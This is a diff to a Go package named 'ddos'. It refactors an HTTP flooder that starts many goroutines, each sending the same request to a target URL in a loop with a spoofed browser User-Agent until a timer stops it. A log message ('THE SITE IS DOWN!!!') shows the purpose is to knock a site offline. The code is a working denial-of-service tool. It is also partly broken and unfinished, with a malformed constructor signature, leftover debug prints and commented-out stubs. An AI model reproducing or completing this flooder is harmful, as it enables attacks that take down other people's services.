@@ -1,8 +1,8 @@
 package ddos
 
 import (
+	"fmt"
 	"io"
-	"io/ioutil"
 	"log"
 	"net/http"
 	"runtime"
@@ -11,26 +11,32 @@ import (
 	"time"
 )
 
-func NewFlooder(url string) *flooder {
-	return &flooder{
+func NewFlooder(url string, workerAmount, uint16, duration uint32) *flooder {
+	ddos := &flooder{
 		url: url,
 		header: []string{
-			"Accept: */*",
-			"Accept-Encoding: *",
-			"Accept-Language: *",
-			"Accept-Charset: *",
+			"Accept:*/*",
+			"Accept-Encoding:*",
+			"Accept-Language:*",
+			"Accept-Charset:*",
+			"Connection:Keep-Alive",
+			"Cache-Control:max-age=0",
+			"User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
 		},
 		workerAmount: 0,
 		client:       http.DefaultClient,
 		stopSignal:   make(chan bool),
 	}
+
+	ddos.SetDuration(duration)
+	return ddos
 }
 
 type Flooder interface {
 	Flood()
 	Stop()
 	SetWorkerAmount(workers uint16)
-	SetFloodTime(seconds int32)
+	SetDuration(seconds uint32)
 }
 
 type flooder struct {
@@ -39,18 +45,16 @@ type flooder struct {
 	client       *http.Client
 	workerAmount uint16
 	stopSignal   chan bool
+	startSignal  *chan bool
 	duration     time.Duration
 	wg           sync.WaitGroup
+	timer        *time.Timer
 }
 
-func (f *flooder) Flood(startSignal ...*<-chan bool) {
+func (f *flooder) Flood() {
 	defaultRequest := f.configRequest()
 
 	for idx := uint16(0); idx < f.workerAmount; idx++ {
-		if startSignal != nil {
-			<-(*startSignal[0])
-		}
-
 		f.wg.Add(1)
 		go func() {
 			defer f.wg.Done()
@@ -58,7 +62,17 @@ func (f *flooder) Flood(startSignal ...*<-chan bool) {
 		}()
 	}
 
-	f.wg.Wait()
+	f.timer = time.NewTimer(f.duration)
+
+	select {
+	case <-f.timer.C:
+		fmt.Println("saiu")
+		f.Stop()
+		fmt.Println("saiu")
+
+	}
+
+	f.timer.Stop()
 }
 
 func (f flooder) configRequest() *http.Request {
@@ -74,7 +88,6 @@ func (f flooder) configRequest() *http.Request {
 		}
 	}
 
-	defaultRequest.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36")
 	return defaultRequest
 }
 
@@ -84,15 +97,20 @@ func (f *flooder) flood(request *http.Request) {
 		case <-f.stopSignal:
 			return
 		default:
+			if f.startSignal != nil {
+				<-(*f.startSignal)
+			}
+
 			resp, err := f.client.Do(request)
 			if err == nil {
-				_, copyErr := io.Copy(ioutil.Discard, resp.Body)
+				fmt.Println("entrou")
+				_, copyErr := io.Copy(io.Discard, resp.Body)
 				closeErr := resp.Body.Close()
 				if copyErr != nil || closeErr != nil {
 					log.Printf("Error occurred during response body copy or close: %v, %v", copyErr, closeErr)
 				}
 			} else {
-				log.Printf("Error occurred during HTTP request: %v", err)
+				log.Printf("THE SITE IS DOWN!!!  --> ERROR MSG: %v\n", err)
 			}
 		}
 		runtime.Gosched()
@@ -108,6 +126,14 @@ func (f *flooder) SetWorkerAmount(workers uint16) {
 	f.workerAmount = workers
 }
 
-func (f *flooder) SetFloodTime(seconds int32) {
+func (f *flooder) SetDuration(seconds uint32) {
 	f.duration = time.Duration(seconds) * time.Second
 }
+
+// func (f *flooder) WithStart() {
+// 	f.startSignal
+// }
+
+// func (f *flooder) WithRoutineCounter() {
+
+// }
